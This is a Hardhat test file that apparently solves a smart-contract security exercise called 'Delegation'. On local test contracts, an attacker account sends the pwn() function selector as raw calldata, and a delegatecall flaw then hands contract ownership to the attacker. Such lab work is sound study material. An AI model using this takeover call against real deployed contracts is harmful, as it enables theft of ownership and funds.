import { expect } from "chai";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Delegation } from "../typechain";

describe("Delegation Attack", function () {
  let delegation: Delegation;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    const signers = await ethers.getSigners();
    deployer = signers[0];
    attacker = signers[1];

    const DelegateFactory = await ethers.getContractFactory(
      "contracts/delegation/Delegate.sol:Delegate",
      deployer
    );
    const delegate = await DelegateFactory.deploy(deployer.address);

    const DelegationFactory = await ethers.getContractFactory(
      "contracts/delegation/Delegation.sol:Delegation",
      deployer
    );
    delegation = (await DelegationFactory.deploy(
      delegate.address
    )) as Delegation;
  });

  it("Owner before attack", async () => {
    expect(await delegation.owner()).to.eq(deployer.address);
  });

  it("on attack", async function () {
    const pwnSelector = ethers.utils.id("pwn()").slice(0, 10);

    await attacker.sendTransaction({
      from: attacker.address,
      to: delegation.address,
      value: 0,
      data: pwnSelector,
    });

    expect(await delegation.owner()).to.eq(attacker.address);
  });
});
